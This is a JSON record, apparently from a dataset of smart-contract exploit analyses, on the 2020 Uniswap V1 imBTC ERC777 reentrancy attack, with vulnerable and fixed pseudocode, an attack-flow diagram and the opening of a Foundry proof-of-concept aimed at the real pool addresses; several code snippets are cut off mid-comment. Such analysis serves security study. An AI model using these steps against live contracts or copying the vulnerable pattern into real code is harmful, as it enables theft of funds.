@@ -1,0 +1,33 @@
+{
+ "id": "2020__2020-04-18_UniswapV1_ERC777Reentrancy",
+ "source_file": "2020/2020-04-18_UniswapV1_ERC777Reentrancy.md",
+ "title": "Uniswap V1 — ERC777 Reentrancy Attack Analysis",
+ "date": "2020-04-18",
+ "protocol": "Uniswap V1",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$300,000 (imBTC)",
+ "loss_usd": 300000.0,
+ "root_cause": "Double withdrawal by reentering via ERC777 `tokensToSend` hook before Uniswap V1 pool ETH balance is updated",
+ "attack_tx": "0x32c83905...",
+ "vulnerable_contract": "0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Uniswap V1 tokenToEthSwapInput pseudocode (vulnerable)\nfunction tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline)\n    external returns (uint256)\n{\n    uint256 eth_bought = getInputPrice(tokens_sold, token.balanceOf(this), address(this).balance);\n\n    //",
+  "❌ Token transfer happens first → ERC777 tokensToSend hook is invoked\n    // Upon reentry inside the hook, address(this).balance has not yet been decremented\n    token.transferFrom(msg.sender, address(this), tokens_sold);\n\n    //",
+  "❌ ETH deduction and transfer happen later\n    msg.sender.transfer(eth_bought);\n    return eth_bought;\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern\nfunction tokenToEthSwapInput(...) external nonReentrant returns (uint256) {\n    //",
+  "✅ Update state first\n    //"
+ ],
+ "steps": [
+  "[2] Swap ETH → imBTC (ethToTokenSwapInput)",
+  "[5] After reentry completes, original call also completes → total 2x ETH obtained"
+ ],
+ "other_code": [
+  "Attacker Contract\n    │\n    ├─[1] Register tokensToSend hook with ERC1820\n    │       erc1820.setInterfaceImplementer(this, ERC777TokensSender, this)\n    │\n    ├─[2] Swap ETH → imBTC (ethToTokenSwapInput)\n    │       Uniswap V1 pool: holds imBTC\n    │\n    ├─[3] Call tokenToEthSwapInput(823084, ...)\n    │       └─ Uniswap: executes imBTC.transferFrom\n    │           └─ ERC777: invokes tokensToSend hook ────────────────────┐\n    │                                                                     │\n    ├─[4] Reentry: re-call tokenToEthSwapInput(823084, ...)  ◄───────────┘\n    │       └─ Pool ETH balance has not yet been updated\n    │           └─ Obtain ETH again at the same price\n    │\n    └─[5] After reentry completes, original call also completes → total 2x ETH obtained",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface UniswapV1 {\n    function ethToTokenSwapInput(uint256 min_token, uint256 deadline) external payable returns (uint256);\n    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);\n}\n\ninterface IERC1820Registry {\n    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;\n}\n\ninterface IERC777 {\n    function approve(address spender, uint256 value) external returns (bool);\n}\n\ncontract ContractTest is Test {\n    UniswapV1 uniswapv1 = UniswapV1(0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187); // imBTC/ETH pool\n    IERC777 imbtc = IERC777(0x3212b29E33587A00FB1C83346f5dBFA69A458923);          // E"
+ ]
+}
